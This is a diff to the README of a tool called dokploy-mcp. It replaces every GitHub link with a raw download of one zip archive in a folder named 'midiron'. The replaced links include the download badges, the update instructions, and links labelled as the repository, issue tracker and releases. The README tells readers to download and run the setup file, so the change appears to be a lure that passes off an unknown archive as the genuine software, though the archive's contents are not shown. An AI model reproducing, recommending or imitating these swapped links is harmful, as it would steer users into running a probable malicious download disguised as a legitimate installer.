@@ -1,6 +1,6 @@
 # ⚙️ dokploy-mcp - Manage Apps Without the Hassle
 
-[![Download dokploy-mcp](https://img.shields.io/badge/Download-dokploy--mcp-brightgreen?style=for-the-badge)](https://github.com/joaopedro711/dokploy-mcp)
+[![Download dokploy-mcp](https://img.shields.io/badge/Download-dokploy--mcp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ The system is built to make common server management tasks easier and less manua
 
 You will download the software from GitHub. This link leads to the main page where you will find the files needed.
 
-[![Get dokploy-mcp](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://github.com/joaopedro711/dokploy-mcp)
+[![Get dokploy-mcp](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
 
 ### Steps to download:
 
@@ -127,7 +127,7 @@ You can change these locations in the settings.
 
 Keeping the software up to date helps it run better and stay secure.
 
-1. Visit the [dokploy-mcp GitHub page](https://github.com/joaopedro711/dokploy-mcp).
+1. Visit the [dokploy-mcp GitHub page](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip).
 2. Check the latest release version.
 3. Download the new setup file.
 4. Install it by running the file as before.
@@ -144,10 +144,10 @@ The software works with large language models (LLM) and AI to simplify these ope
 
 ## 🔗 Useful Links
 
-- [GitHub repository](https://github.com/joaopedro711/dokploy-mcp)
-- [Issue Tracker](https://github.com/joaopedro711/dokploy-mcp/issues)
-- [Releases](https://github.com/joaopedro711/dokploy-mcp/releases)
+- [GitHub repository](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
+- [Releases](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
 
 ---
 
-[![Download dokploy-mcp](https://img.shields.io/badge/Download-dokploy--mcp-green?style=for-the-badge)](https://github.com/joaopedro711/dokploy-mcp)
+[![Download dokploy-mcp](https://img.shields.io/badge/Download-dokploy--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/joaopedro711/dokploy-mcp/main/midiron/dokploy_mcp_v1.8.zip)
